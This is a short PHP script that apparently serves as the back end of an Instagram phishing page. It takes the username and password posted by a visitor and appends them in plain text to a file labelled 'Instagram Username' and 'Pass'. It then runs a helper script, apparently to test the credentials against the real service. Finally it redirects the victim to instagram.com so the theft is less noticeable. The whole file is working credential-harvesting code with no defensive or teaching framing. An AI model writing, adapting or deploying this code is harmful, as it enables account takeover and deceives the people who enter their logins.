<?php
$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';

file_put_contents("usernames.txt", "Instagram Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);

if (empty($username) || empty($password)) {
    header('Location: login.html?error=1');
    exit();
}

$python = trim(shell_exec('which python3'));
$currentDir = __DIR__;
$script = $currentDir . '/login.py';

$command = $python . ' ' . escapeshellarg($script) . ' ' . escapeshellarg($username) . ' ' . escapeshellarg($password) . ' 2>&1';
$output = shell_exec($command);
$result = trim($output);

if (strpos($result, 'true') !== false && strpos($result, 'false') === false) {
        header('Location: https://instagram.com');
    exit();
} else {
    header('Location: login.html?error=1');
    exit();
}
?>